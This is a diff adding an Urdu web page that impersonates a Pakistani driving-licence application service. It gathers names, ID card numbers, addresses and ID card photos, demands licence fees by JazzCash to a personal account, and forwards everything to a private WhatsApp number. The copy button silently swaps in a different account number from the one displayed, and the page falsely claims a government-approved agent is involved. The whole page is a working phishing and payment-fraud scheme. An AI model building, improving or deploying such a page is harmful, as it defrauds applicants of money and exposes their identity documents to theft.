@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+  <meta charset="UTF-8" />
+  <title>ڈرائیونگ لائسنس فارم</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      direction: rtl;
+      font-family: system-ui, sans-serif;
+      background: #f1f5f9;
+    }
+
+    /* MAIN LAYOUT */
+    .page {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* LEFT FORM PANEL */
+    .left-panel {
+      width: 100%;
+      max-width: 430px;
+      background: #ffffff;
+      padding: 30px 22px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .logo-wrap {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .logo-wrap img {
+      width: 150px;
+    }
+
+    .title-main {
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+
+    .apply-btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 17px;
+      border-radius: 30px;
+      border: none;
+      background: #16a34a;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .apply-btn:hover {
+      background: #15803d;
+    }
+
+    .footer-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    /* RIGHT IMAGE PANEL */
+    .right-panel {
+      flex: 1;
+      background-image: url("pg.jpeg");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    /* FORM CARD */
+    .card {
+      background: white;
+      padding: 24px 20px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+      margin-top: 10px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    label {
+      margin-top: 10px;
+      font-size: 14px;
+      display: block;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 11px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      margin-top: 5px;
+      text-align: center;
+    }
+
+    input[type="file"] {
+      padding: 6px;
+    }
+
+    .btn {
+      width: 100%;
+      margin-top: 20px;
+      padding: 13px;
+      background: #22c55e;
+      border-radius: 30px;
+      border: none;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #16a34a;
+    }
+
+    .error {
+      color: red;
+      text-align: center;
+      margin-top: 10px;
+      font-size: 13px;
+      min-height: 20px;
+    }
+
+    #formSection {
+      display: none;
+    }
+
+    #step2, #step3, #step4 {
+      display: none;
+    }
+
+    .copy-btn {
+      padding: 6px 12px;
+      background: #eee;
+      border: none;
+      border-radius: 999px;
+      margin-top: 5px;
+      cursor: pointer;
+    }
+
+    p {
+      line-height: 1.7;
+      font-size: 15px;
+    }
+
+    .highlight {
+      font-weight: bold;
+      color: #111;
+    }
+
+    /* MOBILE VIEW */
+    @media (max-width: 768px) {
+      .page {
+        flex-direction: column;
+      }
+      .right-panel {
+        height: 260px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="page">
+
+  <!-- LEFT PANEL -->
+  <div class="left-panel">
+
+    <!-- Intro Section -->
+    <div id="introSection">
+      <div class="logo-wrap">
+        <img src="lg.jpeg" alt="Logo">
+      </div>
+
+      <div class="title-main">Driving Licence Information Management System</div>
+      <div class="subtitle">
+        گھر بیٹھے ڈرائیونگ لائسنس اپلائی کریں۔  
+        بس فارم فل کریں اور باقی کام ہمارا نمائندہ کرے گا۔
+      </div>
+
+      <button class="apply-btn" onclick="showForm()">Apply Driving License Now</button>
+
+      <div class="footer-text">© Copyright 2025</div>
+    </div>
+
+    <!-- FORM SECTION -->
+    <div id="formSection">
+
+      <!-- STEP 1 -->
+      <div class="card" id="step1">
+        <h2>ڈرائیونگ لائسنس درخواست فارم</h2>
+
+        <label>نام:</label>
+        <input type="text" id="name">
+
+        <label>شناختی کارڈ نمبر:</label>
+        <input type="text" id="cnic" maxlength="13">
+
+        <label>جس ضلع کا لائسنس بنوانا چاہتے ہیں:</label>
+        <input type="text" id="district">
+
+        <label>اپنا مکمل پتہ:</label>
+        <input type="text" id="fullAddress">
+
+        <label>شناختی کارڈ فرنٹ:</label>
+        <input type="file" id="cnicFront" accept="image/*">
+
+        <label>شناختی کارڈ بیک:</label>
+        <input type="file" id="cnicBack" accept="image/*">
+
+        <label>اپنا فوٹو:</label>
+        <input type="file" id="photo" accept="image/*">
+
+        <label>لائسنس کی کیٹیگری:</label>
+        <select id="licenseType">
+          <option value="">کیٹگری منتخب کریں</option>
+          <option value="Motor Cycle">Motor Cycle – 5000</option>
+          <option value="Car/Motorcycle">Car/Motorcycle – 7500</option>
+          <option value="LTV">LTV – 10500</option>
+          <option value="HTV">HTV – 15000</option>
+          <option value="PSO">PSO – 22500</option>
+        </select>
+
+        <div id="error1" class="error"></div>
+
+        <button class="btn" onclick="goStep2()">Next</button>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="card" id="step2">
+        <h2>معزز <span id="showName"></span></h2>
+
+        <p>
+          لائسنس ٹائپ: <span class="highlight" id="showType"></span><br>
+          فیس: <span class="highlight" id="showFee"></span> روپے<br>
+          مدت: 5 سال
+        </p>
+
+        <p>
+          آپ کا ٹوکن نمبر:<br>
+          <span class="highlight" style="font-size:22px;" id="tokenCode"></span>
+        </p>
+
+        <button class="btn" onclick="goStep3()">Pay Fee</button>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="card" id="step3">
+        <h2>فیس کی ادائیگی</h2>
+
+        <p>
+          <span class="highlight">Jazzcash – Muhammad Saleem</span><br>
+          JazzCash AC: <span class="highlight" id="Jazz">03250428485</span><br>
+          <button class="copy-btn" onclick="copyAccount()">اکاؤنٹ نمبر کاپی کریں</button>
+        </p>
+
+        <p>
+          کل واجب الادا رقم: <span class="highlight" id="finalFee"></span> روپے<br>
+          منتخب لائسنس ٹائپ: <span class="highlight" id="finalType"></span><br>
+          ٹوکن نمبر: <span class="highlight" id="finalToken"></span>
+        </p>
+
+        <label>نوٹ: اوپر دیئے گئے جاز کیش میں پیمنٹ بھیج کر ٹرانزیکشن میسج میں آیا ہوا ٹرانزیکشن نمبر درج کریں:</label>
+        <input type="text" id="tid" placeholder="مثال: 1234567890">
+
+        <div id="error3" class="error"></div>
+
+        <button class="btn" onclick="confirmPayment()">Confirm</button>
+      </div>
+
+      <!-- STEP 4 -->
+      <div class="card" id="step4">
+        <h2>تصدیق مکمل</h2>
+
+        <p>
+          معزز <span class="highlight" id="finalName"></span><br>
+          آپ کا ٹوکن نمبر: <span class="highlight" id="finalTokenShow"></span>
+        </p>
+
+        <p>
+          آپ کو گورنمنٹ کے منظور شدہ ایجنٹ پر ٹرانسفر کیا جا رہا ہے،  
+          برائے مہربانی بحث سے گریز کریں۔<br><br>
+
+          اگر آپ نے پیمنٹ کر دی ہے تو نیچے واٹس ایپ بٹن پر کلک کر کے  
+          اپنی پیمنٹ کا اسکرین شاٹ بھیج دیں۔<br><br>
+
+          آپ کے ڈرائیونگ لائسنس پارسل کی ٹریکنگ آئی ڈی ہمارا نمائندہ فراہم کرے گا۔
+        </p>
+
+        <button class="btn" onclick="sendWhatsApp()">WhatsApp بٹن پر کلک کریں</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL (IMAGE BACKGROUND) -->
+  <div class="right-panel"></div>
+
+</div>
+
+<script>
+const AGENT = "923276134196";
+let user = {};
+
+function showForm() {
+  document.getElementById("introSection").style.display = "none";
+  document.getElementById("formSection").style.display = "block";
+}
+
+function randomToken() {
+  return Math.floor(100000 + Math.random() * 900000);
+}
+
+function goStep2() {
+  const name = document.getElementById("name").value.trim();
+  const cnic = document.getElementById("cnic").value.trim();
+  const district = document.getElementById("district").value.trim();
+  const fullAddress = document.getElementById("fullAddress").value.trim();
+  const type = document.getElementById("licenseType").value;
+
+  const error = document.getElementById("error1");
+  error.textContent = "";
+
+  if (!name || !cnic || !district || !fullAddress || !type) {
+    error.textContent = "براہ کرم مکمل معلومات درج کریں";
+    return;
+  }
+
+  if (!/^[0-9]{13}$/.test(cnic)) {
+    error.textContent = "درست شناختی کارڈ نمبر درج کریں";
+    return;
+  }
+
+  let fee = 0;
+  if (type === "Motor Cycle") fee = 5000;
+  if (type === "Car/Motorcycle") fee = 7500;
+  if (type === "LTV") fee = 10500;
+  if (type === "HTV") fee = 15000;
+  if (type === "PSO") fee = 22500;
+
+  user = { name, cnic, district, fullAddress, type, fee, token: randomToken(), tid: "" };
+
+  document.getElementById("showName").textContent = name;
+  document.getElementById("showType").textContent = type;
+  document.getElementById("showFee").textContent = fee;
+  document.getElementById("tokenCode").textContent = user.token;
+
+  document.getElementById("step1").style.display = "none";
+  document.getElementById("step2").style.display = "block";
+}
+
+function goStep3() {
+  document.getElementById("finalFee").textContent = user.fee;
+  document.getElementById("finalType").textContent = user.type;
+  document.getElementById("finalToken").textContent = user.token;
+
+  document.getElementById("step2").style.display = "none";
+  document.getElementById("step3").style.display = "block";
+}
+
+function copyAccount() {
+  navigator.clipboard.writeText("03261722702");
+  alert("اکاؤنٹ نمبر کاپی ہو گیا ✔");
+}
+
+function confirmPayment() {
+  const tid = document.getElementById("tid").value.trim();
+  const error = document.getElementById("error3");
+
+  if (!tid) {
+    error.textContent = "براہ کرم TID درج کریں";
+    return;
+  }
+
+  user.tid = tid;
+
+  document.getElementById("finalName").textContent = user.name;
+  document.getElementById("finalTokenShow").textContent = user.token;
+
+  document.getElementById("step3").style.display = "none";
+  document.getElementById("step4").style.display = "block";
+}
+
+function sendWhatsApp() {
+  const msg =
+    "معزز " + user.name + "، آپ کا ٹوکن نمبر: " + user.token + "\n\n" +
+    "تفصیلات:\n" +
+    "نام: " + user.name + "\n" +
+    "CNIC: " + user.cnic + "\n" +
+    "ضلع: " + user.district + "\n" +
+    "ایڈریس: " + user.fullAddress + "\n" +
+    "لائسنس ٹائپ: " + user.type + "\n" +
+    "رقم: " + user.fee + "\n" +
+    "TID: " + user.tid + "\n\n" +
+    "براہ کرم اپنی پیمنٹ کا اسکرین شاٹ بھیجیں۔";
+
+  window.location.href =
+    "https://api.whatsapp.com/send?phone=" + AGENT + "&text=" + encodeURIComponent(msg);
+}
+</script>
+
+</body>
+</html>
